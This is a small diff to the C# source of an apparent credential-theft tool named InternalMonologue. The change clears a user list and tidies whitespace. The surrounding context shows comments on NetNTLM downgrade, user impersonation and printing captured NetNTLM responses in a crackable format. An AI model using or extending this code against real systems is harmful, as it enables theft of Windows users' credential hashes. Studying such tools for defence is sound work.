@@ -489,7 +489,10 @@ namespace InternalMonologue
                 }
             }
 
-
+            if (authenticatedUsers.Count > 0)
+            {
+                authenticatedUsers.Clear();
+            }
             //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
             if (IsElevated())
             {
@@ -537,7 +540,7 @@ namespace InternalMonologue
                 //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                 if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
                 Console.WriteLine(InternalMonologueForCurrentUser(challenge));
-            }           
+            }
         }
 
         //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
@@ -640,7 +643,7 @@ namespace InternalMonologue
             {
                 result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
             }
-            
+
             return result;
         }
 
@@ -700,7 +703,7 @@ namespace InternalMonologue
 
             }
 
-            return ascii;         
+            return ascii;
         }
     }
 
